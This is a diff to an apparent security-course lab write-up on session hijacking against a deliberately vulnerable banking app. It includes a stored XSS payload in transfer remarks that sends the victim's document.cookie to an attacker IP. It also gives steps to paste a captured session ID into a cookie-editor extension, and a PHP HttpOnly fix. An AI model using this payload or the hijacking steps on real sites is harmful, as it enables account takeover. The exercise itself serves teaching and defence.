@@ -341,9 +341,12 @@ __Solution:__
 - Initiate multiple funds transfer with following remarks
 > Multiple transfers are required as the remarks input is limited to 100 characters after encoding the contnets in it. For that reason, **payload is staged**.
 - Remarks in transfer 1:
+
 ```javascript
-<script>new Image().src="http://192.168.37.128:81/c="+document.cookie;</script></script>
+<script>new Image().src="http://192.168.37.128:81/c="+document.cookie;</script>
 ```
+
+![session_hijack_initiate_transfer](images/task2/session_hijack_initiate_transfer.PNG)
 
 - The above scripts automatically sends a `GET` request(whenn the victim page  is loaded) to the attacker address.
 
@@ -367,10 +370,10 @@ __2. Use the implementation from the last step to hijack the session of a custom
 
 __solution:__
 
-- Copy the `USECURITYID=b35oqi84j4l16mecckl4lksf60` that is captured on the server log
-- Install `EditThisCookie` extension from chrome https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg/related?hl=en
+- Copy the `USECURITYID=b35oqi84j4l16mecckl4lksf60`(another captured cookie) that is captured on the server log
+- Installed `EditThisCookie` extension from chrome https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg/related?hl=en
 - Open the login page of the application in a private window 
-- Past the cookie  value, into the `Value` field.
+- Paste the cookie  value, into the `Value` field.
 ![edit_this_cookie](images/task2/edit_this_cookie.PNG)
 - Click on Green tick below the window
 - Reload the page
@@ -401,8 +404,12 @@ __Solution:__
 ```php
 session_set_cookie_params($htbconf['bank/cookievalidity'],null,null,null,true);
 ```
-
+**Result** (after login cookie empty?)
 ![Cookie_Hijaking_Fix](images/task2/4.5.JPG)
+
+
+<!-- Todo Same origin policy -->
+<!-- Todo Fix XSS -->
 
 ### Exercise 5: Session Fixation
 
